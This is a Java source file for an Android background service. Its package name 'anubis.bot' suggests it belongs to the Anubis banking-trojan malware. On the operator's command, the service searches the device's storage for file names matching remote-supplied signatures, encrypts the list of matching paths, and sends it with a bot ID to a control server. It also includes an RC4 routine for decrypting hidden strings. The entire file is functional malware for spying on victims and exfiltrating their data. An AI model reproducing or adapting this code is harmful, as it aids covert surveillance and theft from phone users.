package anubis.bot.myapplication;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Base64;

import java.io.File;

import anubis.bot.myapplication.API.ClassRC4;

public class ServiceFindFiles extends IntentService {

    UtilsClass utilsClass = new UtilsClass();

    String files="";
    String[] findFiles;
    public ServiceFindFiles() {
        super("ServiceFindFiles");
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            String strFindFiles = utilsClass.SetRead(this,"findfiles");
            if(strFindFiles.contains("/")){
                findFiles = strFindFiles.split("/");
            }else{
                findFiles[0]=strFindFiles;
            }


            File mnt = new File("/mnt");
            File mount = new File("/mount");
            File sdcard = new File("/sdcard");
            File storage = new File("/storage");
            File Removable = new File("/Removable");

            getDir(Environment.getExternalStorageDirectory());
            getDir(mnt);
            getDir(mount);
            getDir(sdcard);
            getDir(storage);
            getDir(Removable);

            String data=files.replace("|*|","");
            if(data.length()>10) {
                data = "Found files by signatures:\n" + data;
                utilsClass.POST(this, "4", "p=" + utilsClass.trafEnCr(utilsClass.ID_B(this) + "|" + data + "|"));
            }
            utilsClass.SetWrite(this,"findfiles","**false**");
        }catch (Exception ex){

        }
    }
    //************************************
    void getDir(File rootFolder){
        try{
            System.out.println(rootFolder);
            File[] filesArray = rootFolder.listFiles();
            for (File f: filesArray){
                if (f.isDirectory()){
                    openDir(f);
                }
                else if (f.isFile()){
                    for(int i=0;i<findFiles.length;i++){
                        String tag = findFiles[i];
                        if(tag.length()>1){
                            if(f.getName().contains(tag)){
                                files = files +"|*|" + f.getAbsolutePath() + "\n";
                            }
                        }
                    }
                }
            }
        }catch (Exception ex){}
    }
    void openDir(File Dir){
        File rootFolder = Dir;
        File[] filesArray = rootFolder.listFiles();
        for (File f: filesArray){
            if (f.isDirectory()){
                openDir(f);
            }else if (f.isFile()){
                for(int i=0;i<findFiles.length;i++){
                    String tag = findFiles[i];
                    if(tag.length()>1){
                        if(f.getName().contains(tag)){
                            files = files +"|*|" + f.getAbsolutePath() + "\n";
                        }
                    }
                }
            }
        }
    }
}
